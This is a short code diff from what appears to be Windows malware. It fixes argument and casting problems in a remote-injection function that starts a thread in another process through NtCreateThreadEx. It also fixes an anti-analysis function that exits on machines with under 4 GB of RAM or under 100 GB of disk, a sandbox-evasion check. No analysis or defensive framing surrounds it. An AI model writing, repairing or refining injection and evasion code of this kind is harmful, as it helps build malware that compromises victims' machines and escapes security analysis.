@@ -43,7 +43,7 @@ int remInj() {
     }
 
     HANDLE hThread;
-    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, 0, NULL, NULL, NULL, NULL, NULL);
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, NULL, 0, 0, 0, 0, NULL);
     WaitForSingleObject(HANDLE(hThread), 1000);
 
     NtClose(processHandle);
@@ -55,7 +55,7 @@ int antidbg() {
     MEMORYSTATUSEX memoryStatus;
     memoryStatus.dwLength = sizeof(memoryStatus);
     GlobalMemoryStatusEx(&memoryStatus);
-    DWORD RAM = memoryStatus.ullTotalPhys / 1024 / 1024;
+    DWORD RAM = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
     if (RAM < 4096) {
         return -1;
     }
@@ -63,7 +63,7 @@ int antidbg() {
     DISK_GEOMETRY pDiskGeometry;
     DWORD bytesReturned;
     DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
-    DWORD disk = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+    DWORD disk = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024);
     if (disk < 100) {
         return -1;
     }
